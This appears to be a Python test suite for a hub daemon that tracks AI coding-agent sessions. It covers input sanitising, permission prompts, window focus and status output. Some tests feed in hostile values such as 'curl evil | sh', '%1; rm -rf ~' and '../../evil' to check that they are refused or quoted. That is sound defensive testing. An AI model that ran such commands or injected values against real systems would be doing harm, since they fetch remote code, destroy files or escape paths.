class CleanRowTest(unittest.TestCase):
    SID = "0f8fad5b-d9cb-469f-a165-70867728950e"

    def row(self, **fields):
        return {"id": self.SID, "state": "done", "since": 5, "name": "n", "agent": "pi", **fields}

    def test_a_row_with_a_bad_id_or_state_is_refused(self):
        self.assertIsNone(links.clean_row("far", self.row(id="../../evil")))
        self.assertIsNone(links.clean_row("far", self.row(id="far:" + self.SID)))
        self.assertIsNone(links.clean_row("far", self.row(state="pwned")))
        self.assertIsNone(links.clean_row("far", "nope"))

    def test_control_characters_are_stripped_and_text_capped(self):
        row = links.clean_row("far", self.row(name="a\x1b]0;x\x07b\x9bc", summary="x" * 9000))
        self.assertEqual(row["name"], "a ]0;x b c")
        self.assertEqual(len(row["summary"]), links.TEXT_MAX)

    def test_what_the_host_says_of_pid_window_and_host_is_ignored(self):
        row = links.clean_row("far", self.row(pid=1, window=7, host="near"))
        self.assertEqual((row["pid"], row["window"], row["host"]), (None, None, "far"))

    def test_another_hosts_repository_comes_through(self):
        self.assertEqual(links.clean_row("far", self.row(project="repo"))["project"], "repo")
        item = links.clean_recent("far", {"id": self.SID, "agent": "claude", "cwd": "/a", "project": "repo"})
        self.assertEqual(item["project"], "repo")

    def test_a_held_prompt_keeps_its_lines_and_loses_what_could_disguise_them(self):
        permission = {"id": 3, "tool": "Bash", "about": "a\x1bb", "kind": "evil", "body": "ls\n‮cat\x1b[0m", "complete": True}
        row = links.clean_row("far", self.row(permission=permission))
        self.assertEqual(row["permission"], {"id": 3, "tool": "Bash", "about": "a b", "kind": "text", "body": "ls\n�cat�[0m", "complete": True})

    def test_a_held_prompt_cut_short_on_the_way_cannot_be_allowed(self):
        permission = {"id": 3, "tool": "Bash", "about": "", "kind": "command", "body": "x" * 9000, "complete": True}
        self.assertFalse(links.clean_row("far", self.row(permission=permission))["permission"]["complete"])
        self.assertNotIn("permission", links.clean_row("far", self.row(permission={"id": True})))

    def test_what_a_pane_shows_survives_and_junk_does_not(self):
        row = links.clean_row("far", self.row(said="one\n\ntwo", prompt="a\nb", branch="main", changed=2, peers=["x", 1], activity=9, jobs="nope"))
        self.assertEqual((row["said"], row["prompt"], row["branch"], row["changed"], row["peers"], row["activity"]),
                         ("one\n\ntwo", "a b", "main", 2, ["x"], 9))
        self.assertNotIn("jobs", row)

    def test_a_tmux_pane_or_bridge_that_is_not_one_is_dropped(self):
        row = links.clean_row("far", self.row(tmux="%1; rm -rf ~", bridge="a/../b"))
        self.assertNotIn("tmux", row)
        self.assertNotIn("bridge", row)
        self.assertEqual(links.clean_row("far", self.row(tmux="%12"))["tmux"], "%12")

    def test_an_ended_sessions_resume_is_built_here(self):
        item = links.clean_recent("far", {"id": self.SID, "agent": "claude", "cwd": "/a b;rm", "resume": "curl evil | sh"})
        self.assertEqual(item["resume"], f"""ssh -t far 'cd '"'"'/a b;rm'"'"' && claude --resume {self.SID}'""")


class ProtocolTest(HubTest):
    def test_a_session_on_another_protocol_is_refused(self):
        proc = self.hub.process()
        pi = Pi(self.hub, self.sid, proc.pid, version=protocol.VERSION - 1)
        pi.wait(lambda: pi.refused)
        self.assertIn("restart the session", pi.refused[0])
        self.assertEqual(self.hub.command("status", "--session-id", self.sid).stdout, "")

    def test_a_malformed_op_is_answered_with_the_field_that_is_off(self):
        client = self.hub.connect()
        client.send(op="focus", session={"id": "x"})
        self.assertEqual(client.wait(lambda m: m["type"] == "error")["error"], "focus.session must be str")


class PeersTest(HubTest):
    """The note on the other sessions in a working tree, in each agent's own tool names."""

    def setUp(self):
        super().setUp()
        self.repo = self.hub.tmp / "repo"
        (self.repo / "sub").mkdir(parents=True)
        subprocess.run(["git", "init", "-q", str(self.repo)], check=True)
        self.root = subprocess.run(["git", "-C", str(self.repo), "rev-parse", "--show-toplevel"], check=True,
                                   capture_output=True, text=True).stdout.strip()
        self.bar = self.hub.subscribe()
        self.claude = self.hub.process()
        self.hub.write_session(self.claude.pid, "claude-1", status="busy", cwd=str(self.repo), name="alpha",
                               messagingSocketPath="/run/a.sock")
        self.elsewhere = self.hub.process()
        self.hub.write_session(self.elsewhere.pid, "elsewhere", status="busy", cwd=str(self.hub.tmp), name="gamma",
                               messagingSocketPath="/run/c.sock")
        self.proc = self.hub.process()
        self.hub.write_session(self.proc.pid, self.sid, status="busy", cwd=str(self.repo / "sub"), name="beta",
                               entrypoint="pi", messagingSocketPath="/run/b.sock")
        self.pi = Pi(self.hub, self.sid, self.proc.pid, cwd=str(self.repo / "sub"))
        self.bar.wait(lambda m: m["type"] == "state" and len(m["sessions"]) == 3)

    def prompt(self):
        event = {"hook_event_name": "UserPromptSubmit", "session_id": "claude-1", "cwd": str(self.repo), "prompt": "go"}
        out = self.hub.command("hook", stdin=json.dumps(event)).stdout
        return json.loads(out)["hookSpecificOutput"]["additionalContext"] if out else ""

    def test_pi_hears_of_the_claude_session_in_its_tree_in_its_own_tool_names(self):
        note = self.pi.start(worktree_tool=True)
        self.assertIn(f"working tree ({self.root})", note)
        self.assertIn("- alpha [", note)
        self.assertIn("(claude-code)", note)
        self.assertIn("send_message", note)
        self.assertIn("enter_worktree", note)
        self.assertNotIn("gamma", note)

    def test_claude_hears_of_the_pi_session_once_until_it_changes(self):
        note = self.prompt()
        self.assertIn("- beta [", note)
        self.assertIn("SendMessage", note)
        self.assertIn("EnterWorktree", note)
        self.assertEqual(self.prompt(), "")
        self.pi.close()
        self.proc.kill()
        self.proc.wait()
        self.bar.wait(lacks_session(self.sid))
        self.assertIn("have it to yourself", self.prompt())

    def test_a_session_alone_in_its_tree_hears_nothing(self):
        event = {"hook_event_name": "UserPromptSubmit", "session_id": "elsewhere", "cwd": str(self.hub.tmp), "prompt": "go"}
        self.assertEqual(self.hub.command("hook", stdin=json.dumps(event)).stdout, "")


class ClaudeIdentityTest(HubTest):
    """A Claude Code session's name and profile, from its registry entry and its hooks."""

    def setUp(self):
        super().setUp()
        self.proc = self.hub.process()
        self.bar = self.hub.subscribe()
        self.hub.write_session(self.proc.pid, self.sid, status="busy", name="repo-12", nameSource="derived")
        self.bar.wait(has_session(self.sid))
        self.transcript = self.hub.write_transcript(self.sid, [prompt("fix the build"), *ran(), said("Fixed.")])

    def hook(self, name, session_id=None, **env):
        event = {"hook_event_name": name, "session_id": session_id or self.sid, "cwd": "/repo",
                 "transcript_path": str(self.transcript), "prompt": "and the eval", "source": "startup"}
        return self.hub.command("hook", stdin=json.dumps(event), **env).stdout

    def test_the_registrys_name_names_it_and_one_the_person_chose_says_so(self):
        self.bar.wait(has_session(self.sid, lambda s: s["name"] == "repo-12"))
        self.hub.write_session(self.proc.pid, self.sid, status="busy", name="mine", nameSource="user")
        self.bar.wait(has_session(self.sid, lambda s: s["name"] == "mine"))

    def test_claudes_own_title_beats_the_registrys_name_but_not_one_the_person_chose(self):
        self.transcript = self.hub.write_transcript(self.sid, [prompt("fix the build"), {"type": "ai-title", "aiTitle": "Build fix"},
                                                               said("Fixed.")])
        self.hook("Stop")
        self.bar.wait(has_session(self.sid, lambda s: s["name"] == "Build fix"))
        self.hub.write_session(self.proc.pid, self.sid, status="idle", name="mine", nameSource="user")
        self.bar.wait(has_session(self.sid, lambda s: s["name"] == "mine"))

    def test_ended_session_resumes_under_its_profile(self):
        self.hook("SessionStart", CLAUDE_CONFIG_DIR="/profiles/.claude-work")
        self.hook("Stop")
        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "done"))
        self.proc.kill()
        self.proc.wait()
        state = self.bar.wait(lambda m: m["type"] == "state" and m["recent"])
        self.assertEqual((state["recent"][0]["name"], state["recent"][0]["resume"]), ("repo-12", f"cd /repo && claude-work --resume {self.sid}"))
        again = self.hub.process()
        self.hook("SessionStart", CLAUDE_CONFIG_DIR="/profiles/.claude-work")
        self.hub.write_session(again.pid, self.sid, status="idle", name="repo-12", nameSource="derived")
        state = self.bar.wait(has_session(self.sid, lambda s: s["history"]))
        self.assertEqual(state["recent"], [])

    def test_a_session_its_hooks_named_before_the_registry_lives_until_its_session_end(self):
        live = self.hub.process()
        self.hook("UserPromptSubmit", session_id="early", CLAUDE_PID=str(live.pid))
        self.hook("Stop", session_id="early", CLAUDE_PID=str(live.pid))
        state_file = self.hub.tmp / "state.json"
        eventually(lambda: state_file.exists() and '"did": "Fixed."' in state_file.read_text())
        self.hub.command("hook", stdin=json.dumps({"hook_event_name": "SessionEnd", "session_id": "early",
                                                   "reason": "prompt_input_exit"}), CLAUDE_PID=str(live.pid))
        state = self.bar.wait(lambda m: m["type"] == "state" and m["recent"])
        self.assertEqual([(r["id"], r["name"]) for r in state["recent"]], [("early", "repo")])


class WaitingTest(HubTest):
    def setUp(self):
        super().setUp()
        self.proc = self.hub.process()
        self.window = 7
        self.hub.niri({"WindowsChanged": {"windows": [
            {"id": self.window, "pid": self.proc.pid, "is_focused": False},
            {"id": 8, "pid": 1, "is_focused": True},
        ]}})
        self.bar = self.hub.subscribe()
        self.hub.write_session(self.proc.pid, self.sid, status="busy")
        self.bar.wait(has_session(self.sid, lambda s: s["window"] == self.window))

    def label(self, text):
        self.hub.connect().send(op="dialog", session=self.sid, text=text)

    def test_waiting_session_is_asking_with_the_agents_own_reason(self):
        self.hub.write_session(self.proc.pid, self.sid, status="waiting", waitingFor="permission prompt")
        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "asking" and s["waitingFor"] == "permission prompt"))

    def asking(self, label="permission prompt"):
        self.hub.write_session(self.proc.pid, self.sid, status="waiting", waitingFor=label)
        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "asking" and s["waitingFor"] == label))

    def test_a_dismissed_prompt_stays_away_until_there_is_a_new_one(self):
        self.asking()
        self.bar.send(op="dismiss", session=self.sid)
        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "working"))
        self.hub.write_session(self.proc.pid, self.sid, status="busy")
        self.asking()

    def test_undo_brings_back_a_prompt_still_open_and_it_is_not_logged(self):
        self.asking()
        self.bar.send(op="dismiss", session=self.sid)
        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "working"))
        self.bar.send(op="undo")
        row = session(self.bar.wait(has_session(self.sid, lambda s: s["state"] == "asking")), self.sid)
        self.assertFalse(row["pulse"])
        self.assertEqual(self.hub.command("log", "--since", "1h").stdout, "")

    def test_hook_label_stands_in_for_the_reason_until_the_session_moves_on(self):
        self.hub.write_session(self.proc.pid, self.sid, status="waiting", waitingFor="permission prompt")
        self.label("Bash: rm -rf build")
        self.bar.wait(has_session(self.sid, lambda s: s["waitingFor"] == "Bash: rm -rf build"))
        self.hub.write_session(self.proc.pid, self.sid, status="busy")
        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "working"))
        self.hub.write_session(self.proc.pid, self.sid, status="waiting", waitingFor="input needed")
        self.bar.wait(has_session(self.sid, lambda s: s["waitingFor"] == "input needed"))

    def test_label_that_beats_the_registry_survives_the_switch_to_waiting(self):
        self.label("Bash: make")
        self.hub.write_session(self.proc.pid, self.sid, status="waiting", waitingFor="permission prompt")
        self.bar.wait(has_session(self.sid, lambda s: s["waitingFor"] == "Bash: make"))

    def test_hook_reports_the_call_as_one_line(self):
        self.hub.write_session(self.proc.pid, self.sid, status="waiting", waitingFor="permission prompt")
        self.hub.held_hook(self, self.sid, {"command": "rm -rf build\n  && make"})
        self.bar.wait(has_session(self.sid, lambda s: s["waitingFor"] == "Bash: rm -rf build && make"))

    def test_dialog_that_only_shows_something_is_not_asking(self):
        self.hub.write_session(self.proc.pid, self.sid, status="waiting", waitingFor="dialog open")
        # A dialog that asks nothing publishes nothing, so read the row off another session's change.
        canary = self.hub.process()
        self.hub.write_session(canary.pid, "canary", status="busy")
        row = session(self.bar.wait(has_session("canary")), self.sid)
        self.assertEqual(row["state"], "working")


class NiriTest(HubTest):
    """The compositor's socket name carries niri's pid, so a hub started beside it can
    come up without NIRI_SOCKET; it has to find the socket itself."""

    def streamed_socket(self, proc):
        """The socket the daemon's event stream ran with, once it has mapped a window."""
        bar = self.hub.subscribe()
        self.hub.niri({"WindowsChanged": {"windows": [{"id": 9, "pid": proc.pid, "is_focused": False}]}})
        self.hub.write_session(proc.pid, self.sid, status="busy")
        bar.wait(has_session(self.sid, lambda s: s["window"] == 9))
        return self.hub.socket_log.read_text().split()[-1]

    def test_finds_the_compositors_socket_without_niri_socket_in_its_environment(self):
        proc = self.hub.process()
        socket = self.hub.tmp / "run" / f"niri.wayland-1.{proc.pid}.sock"
        socket.touch()
        self.hub.restart()
        self.assertEqual(self.streamed_socket(proc), str(socket))

    def test_a_socket_left_by_a_compositor_that_restarted_is_not_used(self):
        proc = self.hub.process()
        socket = self.hub.tmp / "run" / "niri.wayland-1.999.sock"
        socket.touch()
        self.hub.env["NIRI_SOCKET"] = str(self.hub.tmp / "gone.sock")
        self.hub.restart()
        self.assertEqual(self.streamed_socket(proc), str(socket))


class FakeHyprland:
    """Hyprland's two sockets in the hub's runtime dir: requests answered from `clients`
    and `active`, dispatches kept in `requests`, and an event stream to write to."""

    def __init__(self, runtime):
        self.dir = runtime / "hypr" / "signature"
        self.dir.mkdir(parents=True)
        self.clients, self.active, self.requests, self.streams = [], {}, [], []
        self.servers = [self.serve(".socket.sock", self.answer), self.serve(".socket2.sock", self.streams.append)]

    def serve(self, name, handle):
        server = socket.socket(socket.AF_UNIX)
        server.bind(str(self.dir / name))
        server.listen()

        def accept():
            while True:
                try:
                    handle(server.accept()[0])
                except OSError:
                    return

        threading.Thread(target=accept, daemon=True).start()
        return server

    def answer(self, conn):
        with conn:
            message = conn.recv(65536).decode()
            if message == "j/clients":
                conn.sendall(json.dumps(self.clients).encode())
            elif message == "j/activewindow":
                conn.sendall(json.dumps(self.active).encode())
            # The hub's probe connects and says nothing.
            elif message:
                self.requests.append(message)
                conn.sendall(b"ok")

    def event(self, line):
        for stream in self.streams:
            stream.sendall((line + "\n").encode())

    def stop(self):
        for name in (".socket.sock", ".socket2.sock"):
            (self.dir / name).unlink(missing_ok=True)
        for stream in self.streams:
            stream.shutdown(socket.SHUT_RDWR)
            stream.close()
        self.streams.clear()


class HyprlandTest(HubTest):
    """niri and Hyprland sessions share one config, so the hub takes a Hyprland that answers
    and niri otherwise."""

    def setUp(self):
        super().setUp()
        self.hyprland = FakeHyprland(self.hub.tmp / "run")
        self.addCleanup(self.hyprland.stop)
        self.proc = self.hub.process()
        self.hyprland.clients = [{"address": "0x1f", "pid": self.proc.pid}]
        self.hub.restart()
        self.bar = self.hub.subscribe()
        self.hub.write_session(self.proc.pid, self.sid, status="waiting")
        self.bar.wait(has_session(self.sid, lambda s: s["window"] == 0x1F))

    def test_focuses_a_window_by_its_address(self):
        self.hub.command("focus-next")
        eventually(lambda: self.hyprland.requests)
        self.assertEqual(self.hyprland.requests, ['/dispatch hl.dsp.focus({ window = "address:0x1f" })'])

    def test_a_window_opened_later_is_mapped(self):
        other, sid = self.hub.process(), str(uuid.uuid4())
        self.hyprland.clients.append({"address": "0x2a", "pid": other.pid})
        self.hyprland.event("openwindow>>2a,1,com.mitchellh.ghostty,fish")
        self.hub.write_session(other.pid, sid)
        self.bar.wait(has_session(sid, lambda s: s["window"] == 0x2A))

    def test_niri_takes_over_once_hyprland_is_gone(self):
        self.hyprland.stop()
        self.hub.niri({"WindowsChanged": {"windows": [{"id": 7, "pid": self.proc.pid, "is_focused": False}]}})
        self.bar.wait(has_session(self.sid, lambda s: s["window"] == 7))


class OrderTest(HubTest):
    def setUp(self):
        super().setUp()
        now = int(time.time() * 1000)
        self.procs = {name: self.hub.process() for name in ("old", "new", "done", "busy", "mark")}
        self.windows = {name: i + 10 for i, name in enumerate(self.procs)}
        self.hub.niri({"WindowsChanged": {"windows": [
            *({"id": self.windows[name], "pid": proc.pid, "is_focused": False} for name, proc in self.procs.items()),
            {"id": 99, "pid": 1, "is_focused": True},
        ]}})
        self.bar = self.hub.subscribe()
        for name in ("done", "busy"):
            self.hub.write_session(self.procs[name].pid, name, status="busy")
        self.bar.wait(has_session("done", lambda s: s["window"] is not None))
        self.done = Pi(self.hub, "done", self.procs["done"].pid)
        self.done.start(prompt="ok")
        self.done.end()
        self.hub.write_session(self.procs["new"].pid, "new", status="waiting", since=now - 1_000)
        self.hub.write_session(self.procs["old"].pid, "old", status="waiting", since=now - 60_000)
        self.hub.write_session(self.procs["mark"].pid, "mark", status="idle")
        self.state = self.bar.wait(lambda m: m["type"] == "state" and len(m["sessions"]) == 5
                                   and all(s["window"] is not None for s in m["sessions"])
                                   and session(m, "done")["state"] == "done")
        self.marks = 0

    def focus(self, window):
        """Focuses `window` in niri, and waits until the hub has seen it."""
        self.hub.niri({"WindowFocusChanged": {"id": window}})
        # Focus alone publishes nothing; the marker's new window, later in the same stream, does.
        self.marks += 1
        self.hub.niri({"WindowOpenedOrChanged": {"window": {"id": 1000 + self.marks, "pid": self.procs["mark"].pid}}})
        self.bar.wait(has_session("mark", lambda s: s["window"] == 1000 + self.marks))

    def test_longest_waiting_first_then_finished_then_working(self):
        self.assertEqual([s["id"] for s in self.state["sessions"]], ["old", "new", "done", "busy", "mark"])

    def test_focus_next_walks_the_sessions_that_want_you_and_wraps(self):
        expected = [self.windows[name] for name in ("old", "new", "done", "old")]
        for i, window in enumerate(expected):
            self.hub.command("focus-next")
            eventually(lambda: len(self.hub.focused()) == i + 1)
            self.assertEqual(self.hub.focused()[-1], str(window))
            self.focus(window)

    def test_focus_next_with_nothing_wanting_you_does_nothing(self):
        for name in ("old", "new"):
            self.hub.write_session(self.procs[name].pid, name, status="busy")
        self.bar.send(op="dismiss", session="done")
        self.bar.wait(lambda m: m["type"] == "state" and all(s["state"] in ("working", "idle") for s in m["sessions"]))
        client = self.hub.connect()
        # One connection's messages are handled in order, so the state answers after focus-next is done.
        client.send(op="focus-next")
        client.send(op="subscribe")
        client.wait(lambda m: m["type"] == "state")
        self.assertEqual(self.hub.focused(), [])


class StatusTest(HubTest):
    """`agent-hub status`: what an agent's own TUI prints about its session."""

    def setUp(self):
        super().setUp()
        self.proc = self.hub.process()
        self.bar = self.hub.subscribe()
        self.pi = Pi(self.hub, self.sid, self.proc.pid, name="fixture work")
        self.pi.start()
        self.pi.end(said="Kept the old fixture. It still passes.")
        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "done"))

    def status(self, *args):
        return self.hub.command("status", *args).stdout

    def test_prints_the_state_the_reason_and_the_name_for_its_own_session(self):
        self.assertEqual(self.status("--session-id", self.sid), "done\tKept the old fixture.\tfixture work\n")

    def test_falls_back_to_the_pid_of_a_session_whose_id_the_caller_lost(self):
        self.assertEqual(self.status("--session-id", "before-a-clear", "--pid", str(self.proc.pid)),
                         "done\tKept the old fixture.\tfixture work\n")

    # macOS walks parents with `ps`, which is setuid, so a darwin Nix build isn't allowed to run it.
    @unittest.skipIf(parent_pid(os.getpid()) is None, "can't read a process's parent here")
    def test_a_pid_under_the_agent_finds_its_session(self):
        parent = subprocess.Popen([sys.executable, "-c", "import subprocess, sys, time\n"
                                   "child = subprocess.Popen(['sleep', '600'])\nprint(child.pid, flush=True)\ntime.sleep(600)"],
                                  stdout=subprocess.PIPE, text=True)
        self.hub.processes.append(parent)
        child = int(parent.stdout.readline())
        self.addCleanup(os.kill, child, signal.SIGKILL)
        pi = Pi(self.hub, "parent", parent.pid, name="the parent")
        pi.start()
        pi.row(lambda push: push["row"]["state"] == "working")
        self.assertEqual(self.status("--pid", str(child)), "working\t\tthe parent\n")

    def test_json_is_the_hubs_row(self):
        row = json.loads(self.status("--json", "--session-id", self.sid))
        self.assertEqual((row["state"], row["said"], row["name"]), ("done", "Kept the old fixture. It still passes.", "fixture work"))
        self.assertNotIn("label", row)

    def test_prints_nothing_for_a_session_the_hub_does_not_know(self):
        self.assertEqual(self.status("--session-id", "nobody"), "")
        self.assertEqual(self.status("--pid", "1"), "")

    def test_prints_nothing_when_the_hub_is_down(self):
        self.hub.daemon.kill()
        self.hub.daemon.wait()
        self.assertEqual(self.status("--session-id", self.sid), "")


if __name__ == "__main__":
    unittest.main()
